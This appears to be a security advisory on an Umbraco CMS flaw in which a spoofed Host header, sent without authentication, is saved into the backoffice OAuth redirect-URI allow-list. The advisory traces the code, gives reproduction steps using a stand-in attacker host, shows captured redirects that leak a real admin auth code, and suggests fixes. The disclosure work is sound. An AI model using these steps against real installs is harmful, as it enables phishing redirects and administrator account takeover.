# VULN-059 — Host-header-controlled OAuth redirect-URI pollution of the backoffice client → open redirect + account takeover

| | |
|---|---|
| **ID** | VULN-059 |
| **Software** | Umbraco CMS |
| **Repository** | https://github.com/umbraco/Umbraco-CMS |
| **Affected version** | 18.3.0-rc (commit-pinned; no tagged release) |
| **Commit** | `cee7d8981ab0fd18b4dc96449ae071edf1aaf21e` |
| **Severity** | High — CVSS 3.1 `8.1` (`AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`) non-Production ATO; Production open-redirect-only ≈ `6.1` (`…/C:L/I:L/…`) |
| **Status** | **CONFIRMED (dynamic)** |
| **Auth required** | **None to poison** (unauthenticated `Host` header). The ATO step lures an already-logged-in admin to follow one link (`UI:R`). |
| **Attacker gains** | Persistent, unauthenticated pollution of the backoffice OAuth client's redirect/post-logout URIs → open redirect from the trusted CMS login origin (all installs); on non-Production, a real admin auth code delivered to the attacker = **account takeover**. |

## Summary

OpenIddict validates `redirect_uri` on `/authorize` against each client's **registered** redirect-URI set.
For Umbraco's backoffice public client (`umbraco-back-office`) that set is **not statically configured** — a
pre-authentication middleware rebuilds it on **every** `/umbraco` request from the incoming request's
`Scheme://Host`, and persists it **cumulatively** into `umbracoOpenIddictApplications`. Default installs ship
no `AllowedHosts` and there is no `HostFiltering`/`UseForwardedHeaders` in `src`, so `context.Request.Host` is
the attacker-controlled `Host` header. Anyone who can send one unauthenticated request with a chosen `Host`
therefore registers their own domain as a valid redirect URI — defeating the exact precondition redirect-URI
validation exists to prevent. The auth-code redaction that protects the browser flow
(`HideBackOfficeTokensHandler`) is scoped **only** to `umbraco-back-office`, so the request-host-registered
**dev clients** (`umbraco-swagger`/`umbraco-postman`, present on non-Production) return the *real* code — a
full account-takeover primitive.

Dynamically confirmed: an evil `redirect_uri` that OpenIddict **rejected with 400** was **accepted with a 302
to the attacker host** after a single unauthenticated `Host`-spoofed `GET /umbraco`; via `umbraco-swagger` the
302 carried a **real, un-redacted admin auth code**.

## How it works (mechanism & code trace)

**The taint source — raw Host, pre-auth, on every backoffice request.**

```csharp
// src/Umbraco.Cms.Api.Management/Middleware/BackOfficeAuthorizationInitializationMiddleware.cs:69-74
if (_umbracoRequestPaths.IsBackOfficeRequest(context.Request.Path) == false) { return; }
var host = $"{context.Request.Scheme}://{context.Request.Host}";     // raw Host header, no allow-list
```

This middleware is registered `PrePipeline` (before authentication), so no login is needed. The host is added
**unconditionally** — configuring a canonical URL does *not* suppress it:

```csharp
// :91-101
var hostsToRegister = new HashSet<string>(...) { host };             // tainted host always included
if (_webRoutingSettings.UmbracoApplicationUrl.IsNullOrWhiteSpace() is false)
    hostsToRegister.Add(_webRoutingSettings.UmbracoApplicationUrl);  // additive, not restrictive
foreach (var knownHost in _knownHosts) hostsToRegister.Add(knownHost);
...
await backOfficeApplicationManager.EnsureBackOfficeApplicationAsync(backOfficeHosts);   // :112
```

**The sink — no host allow-list, cumulative + persisted.** The application manager checks only that the URIs
are absolute, then **unions** the new host authorities with the ones already stored in the DB:

```csharp
// src/Umbraco.Cms.Api.Management/Security/BackOfficeApplicationManager.cs:96-98
if (backOfficeHostsAsArray.Any(url => url.IsAbsoluteUri) is false)
    throw new ArgumentException(...);                                // the ONLY check — no host allow-list
// :184-221 MergeWithExistingBackOfficeHostsAsync: reads existing RedirectUris, unions new authorities
// :291-296 builds RedirectUris + PostLogoutRedirectUris = CallbackUrlFor(host, "/umbraco/oauth_complete")
```

So each distinct spoofed `Host` **permanently accretes** into the client's `RedirectUris`/
`PostLogoutRedirectUris`. The default callback path is `/umbraco/oauth_complete`
(`SecuritySettings.StaticAuthorizeCallbackPathName`).

**Dev clients present on non-Production; redaction scoped to back-office only.**

```csharp
// BackOfficeApplicationManager.cs:123-143
if (_webHostEnvironment.IsProduction()) { await Delete(OpenApiUi); await Delete(Postman); }
else { /* CreateOrUpdate umbraco-swagger + umbraco-postman against the same poisoned host set */ }
```

```csharp
// src/Umbraco.Cms.Api.Common/DependencyInjection/HideBackOfficeTokensHandler.cs:115-127
public ValueTask HandleAsync(OpenIddictServerEvents.ApplyAuthorizationResponseContext context)
{
    if (context.Request?.ClientId is not Constants.OAuthClientIds.BackOffice) return ValueTask.CompletedTask; // swagger NOT covered
    if (context.Response.Code is not null) { SetCookie(..., context.Response.Code); context.Response.Code = "[redacted]"; }
}
```

The back-office client's code is swapped into a cookie and shown as `[redacted]`; the swagger client's code is
returned **verbatim** in the redirect — redeemable at `/token` with the attacker's own PKCE verifier.

## Why it is a vulnerability (reasoning)

The whole point of OAuth redirect-URI validation is to stop an attacker from having auth codes/tokens
delivered to a URL they control. Here the allow-list that enforces that is *populated from the attacker's own
`Host` header*, unauthenticated and persistently. The live pre/post contrast makes it unambiguous: the exact
same `/authorize` request is a **400** (rejected) before the spoof and a **302 to the attacker host with a
code** after it. On Production this is at minimum an **open redirect** from the trusted CMS login origin
(phishing, token relay to any legitimately-registered SPA). On non-Production — which frequently shares a
database/keyring with or sits adjacent to production, and is exactly where the un-redacted dev clients live —
it is a **no-consent account takeover**: lure a logged-in admin to one link, receive their real code, redeem
it for admin tokens. It is not by-design: the middleware exists for load-balanced multi-host backoffices, but
trusting the raw `Host` with no allow-list and persisting it cumulatively is the defect.

## Reproduction

`cd exploits/VULN-059 && ./run.sh` (env: `BASE_URL`, `ADMIN_USER`, `ADMIN_PASS`). The exploit uses a fresh
random `evil-<rnd>.attacker.example` each run so the baseline rejection is provable.

1. **Baseline (allow-list is real):** as the logged-in admin, `/authorize` with the evil `redirect_uri` →
   ```
   back-office -> 400 invalid_request ("The specified 'redirect_uri' is not valid for this client application")
   swagger     -> 400 invalid_request
   ```
2. **Poison (unauthenticated):** `GET /umbraco` with header `Host: evil-<rnd>.attacker.example` → `200`.
3. **Post-poison (same requests, now accepted):**
   ```
   back-office -> 302  Location: http://evil-<rnd>.attacker.example/umbraco/oauth_complete?code=[redacted]&state=…   (open redirect)
   swagger     -> 302  Location: http://evil-<rnd>.attacker.example/umbraco/openapi/oauth2-redirect.html?code=<REAL>&state=…   (ATO)
   ```
   The `<REAL>` swagger code (e.g. `ouz2Vu20W-4iS_tQaolR…`) is delivered to the attacker host, un-redacted.

Ends with `[OK]`/`==> VULN-059: CONFIRMED`. Full capture: `run.log`, `request.http`, `response.txt`,
`evidence/pre_vs_post.txt`, `evidence/accepted_redirect.txt`.

## Impact

- **Open redirect (all installs, I:L/C:L, S:C):** `…/authorize?client_id=umbraco-back-office&redirect_uri=
  http://evil/umbraco/oauth_complete&…` (or `signout?post_logout_redirect_uri=…`) 302s to the attacker from
  the trusted CMS origin — high-quality phishing and token-relay staging.
- **Account takeover (non-Production, C:H/I:H):** the un-redacted `umbraco-swagger` client rides the admin's
  `SameSite=Lax` session cookie on a top-level GET, issues a code with **no consent screen**, and delivers the
  real code to the attacker, who redeems it for admin access/refresh tokens.
- **Persistence:** the pollution is stored in `umbracoOpenIddictApplications` and cumulative — it survives and
  accretes across requests until an operator prunes the table.
- **Chaining:** admin tokens → full backoffice compromise, which is RCE-capable via **VULN-001**
  (template/settings code execution). Conceptually chains with any phishing lure.

## Suggested fix

- Never trust the raw `Host` for client registration. Validate the registration host against an operator
  **allow-list**, or require `Security:BackOfficeHost` / `WebRouting:UmbracoApplicationUrl` and register only
  those; do **not** add the request host when a canonical URL is configured.
- Document that operators must set `AllowedHosts` (and use `HostFiltering`/`ForwardedHeaders` correctly behind
  a proxy).
- Extend the `HideBackOfficeTokensHandler` redaction to the `umbraco-swagger`/`umbraco-postman` clients, or
  never register request-derived hosts for them.
- Make redirect-URI registration explicit and non-cumulative (replace, don't union) so a transient spoof
  cannot permanently widen the allow-list.

## References
- OWASP — Unvalidated Redirects and Forwards Cheat Sheet.
- **RFC 9700** (OAuth 2.0 Security Best Current Practice) — exact `redirect_uri` matching; §4 on host-header /
  mix-up hardening.
- Umbraco [issue #21138](https://github.com/umbraco/Umbraco-CMS/issues/21138) (the cumulative-host behaviour as
  a functional bug); [CVE-2024-34071](https://github.com/advisories/GHSA-j74q-mv2c-rxmp) (a *different*
  `returnUrl` open redirect) for contrast.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 70 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. WebFetch `github.com/umbraco/Umbraco-CMS/issues/21138` — "OpenId RedirectUris and PostLogoutRedirectUris are overwritten on a balanced environment"; functional `type/bug`, fixed by PR #21432 (Jan 2026) by *accumulating* hosts; no security discussion of Host-header trust.
2. `gh api search/issues q='repo:umbraco/Umbraco-CMS BackOfficeAuthorizationInitializationMiddleware OR "redirect uri" host header'` — no security-framed results.
3. `gh api repos/umbraco/Umbraco-CMS/commits?path=.../BackOfficeApplicationManager.cs&since=2026-06-01` — only #23599 (concurrency on multi-instance registration) and #23402 (allocations); `BackOfficeAuthorizationInitializationMiddleware.cs` has no commits since June 2026; no allow-list added.
4. GitHub advisory DB full listing for NuGet `Umbraco.Cms` (gh GraphQL) — open-redirect advisories are CVE-2024-34071 (`returnUrl`) and CVE-2026-46616 / GHSA-2qjj-h6wp-c7h7 (surface controllers); none concerns OpenIddict redirect-URI registration or Host-header trust.
5. WebFetch Umbraco docs `reference/configuration/securitysettings` — `BackOfficeHost` is described only as an override "when the Backoffice client runs from a different origin"; no security guidance about untrusted Host headers.

**Related but distinct public references** (same class or component, not this bug):
- Issue #21138 / PR #21432 — same code path, but a load-balancing functional bug whose fix makes the cumulative behaviour explicit.
- CVE-2024-34071 / GHSA-j74q-mv2c-rxmp — `returnUrl` open redirect, different path.
- CVE-2026-46616 / GHSA-2qjj-h6wp-c7h7 — surface-controller open redirect, different component.

**Reasoning:** No public advisory, issue or docs note describes an unauthenticated Host header being persisted into the backoffice OAuth client's redirect-URI allow-list, nor the unredacted auth code via the swagger/postman clients. Host-header poisoning is a well-known generic class and ASP.NET Core `AllowedHosts` guidance exists, so a vendor might partly attribute it to hosting configuration; the persistent, cumulative registration and the redaction gap are the novel, specific parts.
